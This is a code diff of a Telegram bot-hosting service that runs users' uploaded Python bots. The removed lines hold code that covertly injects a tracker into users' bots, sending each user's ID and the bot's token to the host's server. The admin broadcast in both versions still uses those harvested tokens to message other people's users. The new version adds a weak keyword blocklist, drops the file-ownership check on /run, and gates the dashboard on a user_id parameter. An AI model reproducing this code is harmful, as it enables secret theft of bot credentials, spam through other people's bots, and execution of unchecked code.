@@ -1,11 +1,5 @@
-import os
-import telebot
-import subprocess
-import json
-import re
-import requests
-import time
-from flask import Flask, send_file, request, jsonify
+import os, telebot, subprocess, json, re, requests, time, random
+from flask import Flask, request, jsonify
 from threading import Thread
 
 # ===== ENV =====
@@ -21,52 +15,33 @@ os.makedirs(UPLOAD_FOLDER, exist_ok=True)
 
 DATA_FILE = "data.json"
 
-# ===== LOAD DB =====
+# ===== DATABASE =====
 if os.path.exists(DATA_FILE):
-    with open(DATA_FILE) as f:
-        data = json.load(f)
+    data = json.load(open(DATA_FILE))
 else:
     data = {"users": {}, "premium": [], "bot_users": {}}
 
 def save():
-    with open(DATA_FILE, "w") as f:
-        json.dump(data, f)
+    json.dump(data, open(DATA_FILE, "w"))
 
-# ===== PROCESS =====
 processes = {}
 running_tokens = {}
 
-# ===== FLASK =====
-@app.route("/")
-def home():
-    return "🚀 Bot Hosting Running"
+otp_store = {}
+sessions = {}
 
-@app.route("/files/<filename>")
-def files(filename):
-    return send_file(os.path.join(UPLOAD_FOLDER, filename))
-
-@app.route("/add_user", methods=["POST"])
-def add_user():
-    uid = int(request.form.get("user_id"))
-    token = request.form.get("token")
-
-    data["bot_users"].setdefault(token, [])
-
-    if uid not in data["bot_users"][token]:
-        data["bot_users"][token].append(uid)
-        save()
-
-    return jsonify({"ok": True})
-
-def run_flask():
-    app.run(host="0.0.0.0", port=5000)
-
-# ===== TOKEN =====
+# ===== TOKEN SYSTEM =====
 def extract_token(path):
-    with open(path) as f:
-        content = f.read()
-    m = re.search(r'BOT_TOKEN\s*=\s*["\'](.+?)["\']', content)
-    return m.group(1) if m else None
+    content = open(path).read()
+    patterns = [
+        r'BOT_TOKEN\s*=\s*["\'](.+?)["\']',
+        r'TOKEN\s*=\s*["\'](.+?)["\']'
+    ]
+    for p in patterns:
+        m = re.search(p, content)
+        if m:
+            return m.group(1)
+    return None
 
 def valid_token(token):
     try:
@@ -74,42 +49,94 @@ def valid_token(token):
     except:
         return False
 
-# ===== INJECT =====
-def inject_code(path):
-    inject = f"""
-import requests
-def __track(uid):
+def remove_webhook(token):
     try:
-        requests.post("{BASE_URL}/add_user", data={{"user_id": uid, "token": BOT_TOKEN}})
-    except: pass
-"""
+        requests.get(f"https://api.telegram.org/bot{token}/deleteWebhook")
+    except:
+        pass
 
-    with open(path) as f:
-        code = f.read()
+# ===== SECURITY =====
+def is_safe_code(path):
+    bad = ["os.remove", "eval(", "exec(", "subprocess", "shutil"]
+    code = open(path).read()
+    return not any(b in code for b in bad)
 
-    if "__track" in code:
-        return
+# ===== OTP =====
+def generate_otp():
+    return str(random.randint(100000, 999999))
 
-    code = inject + "\n" + code
-    code = code.replace("def start(message):", "def start(message):\n    __track(message.from_user.id)")
+@app.route("/send_otp", methods=["POST"])
+def send_otp():
+    uid = request.form.get("user_id")
+    otp = generate_otp()
+    otp_store[uid] = (otp, time.time())
 
-    with open(path, "w") as f:
-        f.write(code)
+    try:
+        bot.send_message(int(uid), f"🔐 OTP: {otp}")
+    except:
+        return "Start bot first"
+
+    return "sent"
+
+@app.route("/verify_otp", methods=["POST"])
+def verify():
+    uid = request.form.get("user_id")
+    otp = request.form.get("otp")
+
+    if uid in otp_store:
+        real, t = otp_store[uid]
+        if time.time() - t < 120 and otp == real:
+            sessions[uid] = True
+            return "SUCCESS"
+    return "FAIL"
+
+@app.route("/login")
+def login():
+    return '''
+    <form action="/send_otp" method="post">
+    <input name="user_id" placeholder="Telegram ID">
+    <button>Send OTP</button>
+    </form><br>
+    <form action="/verify_otp" method="post">
+    <input name="user_id"><input name="otp">
+    <button>Verify</button>
+    </form>
+    '''
+
+@app.route("/dashboard")
+def dash():
+    uid = request.args.get("user_id")
+    if uid not in sessions:
+        return "Login Required"
+
+    return f"""
+    Users: {len(data['users'])}<br>
+    Bots: {sum(len(v) for v in data['users'].values())}<br>
+    Running: {len(processes)}
+    """
+
+# ===== TRACK API =====
+@app.route("/add_user", methods=["POST"])
+def add_user():
+    uid = int(request.form.get("user_id"))
+    token = request.form.get("token")
+
+    data["bot_users"].setdefault(token, [])
+    if uid not in data["bot_users"][token]:
+        data["bot_users"][token].append(uid)
+        save()
+
+    return jsonify({"ok": True})
 
 # ===== START =====
 @bot.message_handler(commands=['start'])
 def start(msg):
     uid = str(msg.from_user.id)
-
     data["users"].setdefault(uid, [])
     save()
 
     bot.send_message(msg.chat.id,
-        "👋 Welcome!\n\n"
-        "📂 Upload .py\n⚡ /run file.py\n🛑 /stop\n📊 /status\n\n"
-        "🤖 /createbot refer TOKEN\n\n"
-        "💰 Free: 1 Bot\n🔥 Premium: Unlimited\n\n"
-        "📩 Contact: @SohilCodes"
+        "👋 Welcome\n\nUpload .py\n/run file.py\n\n💰 Premium → @SohilCodes"
     )
 
 # ===== UPLOAD =====
@@ -122,50 +149,37 @@ def upload(msg):
         return bot.reply_to(msg, "❌ Only .py")
 
     if uid not in data["premium"] and len(data["users"][uid]) >= 1:
-        return bot.reply_to(msg, "💰 Upgrade → @SohilCodes")
+        return bot.reply_to(msg, "💰 Upgrade @SohilCodes")
 
-    file_info = bot.get_file(file.file_id)
-    data_bytes = bot.download_file(file_info.file_path)
+    info = bot.get_file(file.file_id)
+    data_bytes = bot.download_file(info.file_path)
 
     path = os.path.join(UPLOAD_FOLDER, file.file_name)
-
-    with open(path, "wb") as f:
-        f.write(data_bytes)
-
-    inject_code(path)
+    open(path, "wb").write(data_bytes)
 
     data["users"][uid].append(file.file_name)
     save()
 
-    bot.reply_to(msg, f"✅ Uploaded\n⚡ /run {file.file_name}")
-    bot.forward_message(ADMIN_ID, msg.chat.id, msg.message_id)
+    bot.reply_to(msg, f"✅ Uploaded\n/run {file.file_name}")
 
 # ===== RUN =====
 @bot.message_handler(commands=['run'])
 def run(msg):
     uid = str(msg.from_user.id)
-    file = msg.text.split(maxsplit=1)[1]
-
+    file = msg.text.split()[1]
     path = os.path.join(UPLOAD_FOLDER, file)
 
-    if file not in data["users"].get(uid, []):
-        return bot.reply_to(msg, "❌ Not yours")
-
-    if uid in processes:
-        return bot.reply_to(msg, "⚠️ Already running")
+    if not is_safe_code(path):
+        return bot.reply_to(msg, "❌ Unsafe code")
 
     token = extract_token(path)
-
-    if not token or not valid_token(token) or token == BOT_TOKEN:
+    if not token or not valid_token(token):
         return bot.reply_to(msg, "❌ Invalid token")
 
-    if token in running_tokens:
-        return bot.reply_to(msg, "⚠️ Already running token")
+    remove_webhook(token)
 
     p = subprocess.Popen(["python3", path])
-
-    processes[uid] = (p, file, token)
-    running_tokens[token] = uid
+    processes[uid] = p
 
     bot.reply_to(msg, "🚀 Started")
 
@@ -173,32 +187,18 @@ def run(msg):
 @bot.message_handler(commands=['stop'])
 def stop(msg):
     uid = str(msg.from_user.id)
-
-    if uid not in processes:
-        return bot.reply_to(msg, "❌ No bot")
-
-    p, _, token = processes[uid]
-    p.kill()
-
-    del processes[uid]
-    running_tokens.pop(token, None)
-
-    bot.reply_to(msg, "🛑 Stopped")
-
-# ===== STATUS =====
-@bot.message_handler(commands=['status'])
-def status(msg):
-    bot.reply_to(msg, "🟢 Running" if str(msg.from_user.id) in processes else "🔴 Stopped")
+    if uid in processes:
+        processes[uid].kill()
+        del processes[uid]
+        bot.reply_to(msg, "🛑 Stopped")
 
 # ===== BROADCAST =====
 @bot.message_handler(commands=['broadcast'])
-def broadcast(msg):
+def bc(msg):
     if msg.from_user.id != ADMIN_ID:
         return
 
     text = msg.text.replace("/broadcast ", "")
-    count = 0
-
     for token, users in data["bot_users"].items():
         for u in users:
             try:
@@ -206,35 +206,47 @@ def broadcast(msg):
                     f"https://api.telegram.org/bot{token}/sendMessage",
                     params={"chat_id": u, "text": text}
                 )
-                count += 1
-                time.sleep(0.05)
             except:
                 pass
 
-    bot.reply_to(msg, f"✅ Sent {count}")
+    bot.reply_to(msg, "✅ Sent")
 
-# ===== ADMIN PANEL =====
+# ===== ADMIN PANEL BUTTONS =====
+from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
+
 @bot.message_handler(commands=['admin'])
 def admin(msg):
     if msg.from_user.id != ADMIN_ID:
         return
 
-    bot.send_message(msg.chat.id,
-        "👑 ADMIN PANEL\n\n"
-        "/users\n/premium\n/addpremium ID\n/removepremium ID\n/broadcast MSG"
+    kb = InlineKeyboardMarkup()
+    kb.add(
+        InlineKeyboardButton("👥 Users", callback_data="users"),
+        InlineKeyboardButton("💰 Premium", callback_data="premium")
+    )
+    kb.add(
+        InlineKeyboardButton("➕ Add Premium", callback_data="addp"),
+        InlineKeyboardButton("➖ Remove Premium", callback_data="remp")
     )
 
-@bot.message_handler(commands=['users'])
-def users(msg):
-    if msg.from_user.id != ADMIN_ID:
-        return
-    bot.reply_to(msg, f"👥 Total Users: {len(data['users'])}")
+    bot.send_message(msg.chat.id, "👑 Admin Panel", reply_markup=kb)
 
-@bot.message_handler(commands=['premium'])
-def premium(msg):
-    if msg.from_user.id != ADMIN_ID:
+@bot.callback_query_handler(func=lambda c: True)
+def cb(c):
+    if c.from_user.id != ADMIN_ID:
         return
-    bot.reply_to(msg, f"💰 Premium Users: {data['premium']}")
+
+    if c.data == "users":
+        bot.answer_callback_query(c.id, f"Users: {len(data['users'])}")
+
+    elif c.data == "premium":
+        bot.answer_callback_query(c.id, str(data["premium"]))
+
+    elif c.data == "addp":
+        bot.send_message(c.message.chat.id, "Send: /addpremium ID")
+
+    elif c.data == "remp":
+        bot.send_message(c.message.chat.id, "Send: /removepremium ID")
 
 @bot.message_handler(commands=['addpremium'])
 def addp(msg):
@@ -254,61 +266,11 @@ def remp(msg):
     save()
     bot.reply_to(msg, "❌ Removed")
 
-# ===== AI BUILDER =====
-def generate_bot_code(token):
-    return f'''
-import telebot,requests
-BOT_TOKEN="{token}"
-SERVER="{BASE_URL}"
-bot=telebot.TeleBot(BOT_TOKEN)
-
-def track(uid):
-    try: requests.post(f"{{SERVER}}/add_user",data={{"user_id":uid,"token":BOT_TOKEN}})
-    except: pass
-
-@bot.message_handler(commands=['start'])
-def start(m):
-    track(m.from_user.id)
-    bot.send_message(m.chat.id,"👋 AI Bot Ready!")
-
-bot.infinity_polling()
-'''
-
-@bot.message_handler(commands=['createbot'])
-def createbot(msg):
-    uid = str(msg.from_user.id)
-    token = msg.text.split()[1]
-
-    if not valid_token(token):
-        return bot.reply_to(msg, "❌ Invalid token")
-
-    file = f"{uid}_bot.py"
-    path = os.path.join(UPLOAD_FOLDER, file)
-
-    with open(path, "w") as f:
-        f.write(generate_bot_code(token))
-
-    data["users"].setdefault(uid, []).append(file)
-    save()
-
-    p = subprocess.Popen(["python3", path])
-    processes[uid] = (p, file, token)
-    running_tokens[token] = uid
-
-    bot.reply_to(msg, "🤖 Bot Created & Running!")
-
-# ===== AUTO RESTART =====
-def monitor():
-    while True:
-        for uid, (p, f, t) in list(processes.items()):
-            if p.poll() is not None:
-                new = subprocess.Popen(["python3", os.path.join(UPLOAD_FOLDER, f)])
-                processes[uid] = (new, f, t)
-        time.sleep(5)
-
 # ===== RUN =====
+def run_flask():
+    app.run(host="0.0.0.0", port=5000)
+
 if __name__ == "__main__":
     Thread(target=run_flask).start()
-    Thread(target=monitor).start()
-    print("🚀 Running...")
+    print("🚀 Running")
     bot.infinity_polling()
